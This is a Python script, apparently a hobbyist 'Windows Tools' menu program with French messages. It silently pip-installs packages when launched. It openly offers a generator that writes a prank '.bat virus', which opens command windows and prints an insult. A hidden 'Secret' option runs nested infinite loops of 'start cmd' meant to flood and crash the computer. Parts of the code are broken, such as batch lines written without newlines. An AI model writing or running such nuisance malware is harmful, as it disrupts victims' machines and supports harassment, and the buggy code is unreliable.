import os
try:
    print("Installing requirements...")
    os.system('pip install art >nul')
    os.system('pip install colorama >nul')
    os.system('cls')
except:
    pass

from colorama import *
from art import * 

os.system('title Windows Tools')

banner_maker = """
 _       ___           __                      __  ___      __            
| |     / (_)___  ____/ /___ _      _______   /  |/  /___ _/ /_____  _____
| | /| / / / __ \/ __  / __ \ | /| / / ___/  / /|_/ / __ `/ //_/ _ \/ ___/
| |/ |/ / / / / / /_/ / /_/ / |/ |/ (__  )  / /  / / /_/ / ,< /  __/ /    
|__/|__/_/_/ /_/\__,_/\____/|__/|__/____/  /_/  /_/\__,_/_/|_|\___/_/   
                                                                            """

maker_tools = """
 [1] - Create txt file                     [2] - Create .bat virus

                          [3] - Secret
 """

banner = """
 _       ___           __                      ______            __    
| |     / (_)___  ____/ /___ _      _______   /_  __/___  ____  / /____
| | /| / / / __ \/ __  / __ \ | /| / / ___/    / / / __ \/ __ \/ / ___/
| |/ |/ / / / / / /_/ / /_/ / |/ |/ (__  )    / / / /_/ / /_/ / (__  ) 
|__/|__/_/_/ /_/\__,_/\____/|__/|__/____/    /_/  \____/\____/_/____/"""

tools_banner = """
 [1] - Start CMD                                        [2] - Maker

                              [e] - Exit
"""



try:
    print(Fore.BLUE + banner + Fore.RESET)
    print(Fore.MAGENTA + tools_banner + Fore.RESET)

    choice = input("\n/"+Fore.RED+"~"+Fore.RESET+"> ")
    if choice == "1":
        try:
            print(Fore.GREEN + " * "+Fore.RESET+ "Starting CMD")
            os.system("start cmd")
            os.system('cls')
            print(Fore.BLUE + banner + Fore.RESET)
            print(Fore.GREEN + "\n * " + Fore.RESET + "CMD correctements lancer ! ")
            input("")
        except:
            print(Fore.RED + " ! " + Fore.RESET + "Une erreur est survenue lors du lancement du CMD")
            input("")


    elif choice == "":
        os.system('exit')
       



# MAKER CHOCIE

    elif choice == "2":
        try:
            os.system("cls")
            os.system('title Windows Maker')
            print(Fore.BLUE + banner_maker + Fore.RESET)
            print(Fore.MAGENTA + maker_tools + Fore.RESET)
            maker_choice = input("\n/"+Fore.RED+"~"+Fore.RESET+"> ")

            if maker_choice == "1":
                try:
                    name_txt = input("\n Veuillez entrez le nom du fichier /"+Fore.RED+"~"+Fore.RESET+"> ")
                    open(name_txt+".txt", "a+")
                    print(Fore.GREEN + " * "+Fore.RESET + "txt file créer avec succès !")
                    input("")
                except:
                    print(Fore.RED + " ! " + Fore.RESET + " Une erreur est survenue lors de la création du txt file")

            elif maker_choice == "2":
                try:
                    name_bat = input("\n Veuillez entrez le nom du fichier bat /"+Fore.RED+"~"+Fore.RESET+"> ")
                    f = open(name_bat+".bat", "a+")
                    try:
                        f.write("@echo off")
                        f.write("\n")
                        f.write("start cmd")
                        f.write("start cmd")
                        f.write("echo On t'as bien baiser fdp")
                        input("")
                    except:
                        print(Fore.RED + " ! "+ Fore.RESET + "Une erreur est survenue lors de l'écriture du virus...")
                        input("")
                    else:
                        print(Fore.GREEN + " * " + Fore.RESET + name_bat + "Créer avec succès")
                except:
                    print(Fore.RED + " ! "+Fore.RESET + "Une erreur est survenue lors de la création de " + name_bat)
                    input("")

            elif maker_choice == "3":
                try:
                    while True:
                        os.system("start cmd")
                        os.system('echo Ur crashing now')
                        while True:
                            os.system('start cmd')
                            while True:
                                os.system('start cmd')
                                while True:
                                    os.system('start cmd')
                                    while True:
                                        os.system("start cmd")
                                        while True:
                                            os.system('start cmd')
                                            while True:
                                                os.system('cls')
                                                while True:
                                                    os.system('start cmd')
                                                    input("")
                except:
                    print(Fore.RED + " ! " + Fore.RESET + "Une erreur est survenue lors du lancement de l'option secrète...")
                    input("")


                

        except:
            print(Fore.RED + " ! " + Fore.RESET + "Une erreur est survenue lors du lancement de Windows Maker")
            input("")

    else:
        print(Fore.RED + " ! " + Fore.RESET + "Veuillez entrez une commande valide...")
        input("")


except:
    print(Fore.RED + " ! " + Fore.RESET + " Une erreur est survenue...")
    input("")
